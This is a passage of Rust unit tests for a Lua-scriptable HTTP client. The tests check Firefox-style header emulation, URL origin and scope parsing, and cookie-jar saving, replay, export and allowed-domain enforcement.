        let user_agent = headers.get("user-agent").unwrap().to_str().unwrap();
        assert!(user_agent.contains("Firefox/"), "{user_agent}");
        assert_eq!(headers.get("accept-language").unwrap(), EMULATED_LANGUAGE);
        assert!(headers.get("sec-fetch-mode").is_some());
        // Firefox sends no client hints, which rustls' TLS couldn't back up.
        assert!(headers.get("sec-ch-ua").is_none());
    }

    #[test]
    fn origin_of_strips_the_path_from_a_url() {
        assert_eq!(
            origin_of("https://example.com/a/b?c=1"),
            Some("https://example.com".to_string())
        );
        assert_eq!(
            origin_of("https://example.com"),
            Some("https://example.com".to_string())
        );
        assert_eq!(origin_of("not a url"), None);
    }

    #[test]
    fn set_cookie_adds_to_the_jar_and_respects_allowed_domains() {
        let runtime = runtime();
        let lua = Lua::new();
        let jar = Arc::new(CookieJar::default());
        let recorder = Arc::new(Recorder::new("didaxis"));
        let http_table = table(
            &lua,
            jar.clone(),
            Arc::new(Mutex::new(HashSet::new())),
            recorder,
            runtime.handle().clone(),
            StopSignal::new(),
            &RunOptions {
                debug_http_dump: false,
                browser_emulation: true,
                follow_redirects: true,
                allowed_domains: vec!["allowed.example.com".to_string()],
                browser_visible: false,
            },
        )
        .unwrap();
        lua.globals().set("http", http_table).unwrap();

        lua.load(r#"http.set_cookie("https://allowed.example.com/", "mit=abc; Path=/")"#)
            .exec()
            .unwrap();
        let matches = jar.matches("https://allowed.example.com");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].value, "abc");

        let result = lua
            .load(r#"http.set_cookie("https://evil.example.net/", "mit=abc")"#)
            .exec();
        assert!(result.is_err());
    }

    #[test]
    fn build_jar_replays_saved_cookies() {
        let cookies = vec![Cookie {
            origin: "https://example.com".to_string(),
            set_cookie: "session=abc; Path=/".to_string(),
        }];

        let jar = build_jar(&cookies);

        let matches = jar.matches("https://example.com");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].name, "session");
        assert_eq!(matches[0].value, "abc");
    }

    #[test]
    fn export_cookies_only_exports_visited_urls() {
        let cookies = vec![Cookie {
            origin: "https://example.com".to_string(),
            set_cookie: "session=abc; Path=/".to_string(),
        }];
        let jar = build_jar(&cookies);
        let visited_urls = Mutex::new(HashSet::new());

        assert_eq!(export_cookies(&jar, &visited_urls), Vec::new());

        visited_urls
            .lock()
            .unwrap()
            .insert("https://example.com".to_string());
        let exported = export_cookies(&jar, &visited_urls);

        assert_eq!(exported.len(), 1);
        assert_eq!(exported[0].origin, "https://example.com");
        assert!(exported[0].set_cookie.starts_with("session=abc"));
    }

    #[test]
    fn export_cookies_keeps_a_cookie_scoped_to_a_visited_path() {
        let jar = CookieJar::default();
        jar.add(
            "KEYCLOAK_IDENTITY=abc; Path=/realms/societaire/; Secure",
            "https://login.example.com/realms/societaire/login-actions/authenticate",
        );
        let visited_urls = Mutex::new(HashSet::new());

        // Visiting only the origin's root never path-matches it.
        track_url(&visited_urls, "https://login.example.com/");
        assert_eq!(export_cookies(&jar, &visited_urls), Vec::new());

        track_url(
            &visited_urls,
            "https://login.example.com/realms/societaire/login-actions/authenticate?session_code=x",
        );
        let exported = export_cookies(&jar, &visited_urls);
        assert_eq!(exported.len(), 1);
        assert_eq!(exported[0].origin, "https://login.example.com");
        assert!(exported[0].set_cookie.contains("Path=/realms/societaire"));

        // ...and it replays into a fresh jar under the same scope.
        let restored = build_jar(&exported);
        let matched = restored
            .matches("https://login.example.com/realms/societaire/protocol/openid-connect/auth");
        assert_eq!(matched.len(), 1);
        assert_eq!(matched[0].value, "abc");
    }

    #[test]
    fn export_cookies_exports_a_cookie_matched_by_several_urls_once() {
        let cookies = vec![Cookie {
            origin: "https://example.com".to_string(),
            set_cookie: "session=abc; Path=/".to_string(),
        }];
        let jar = build_jar(&cookies);
        let visited_urls = Mutex::new(HashSet::new());
        track_url(&visited_urls, "https://example.com/a");
        track_url(&visited_urls, "https://example.com/b/c");

        assert_eq!(export_cookies(&jar, &visited_urls).len(), 1);
    }

    #[test]
    fn scope_of_keeps_the_path_and_drops_query_and_fragment() {
        assert_eq!(
            scope_of("https://example.com/a/b?c=1#d"),
            Some("https://example.com/a/b".to_string())
        );
        assert_eq!(
            scope_of("https://example.com"),
            Some("https://example.com/".to_string())
        );
        assert_eq!(
            scope_of("https://example.com?c=1"),
            Some("https://example.com/".to_string())
        );
        assert_eq!(scope_of("not a url"), None);
    }
}
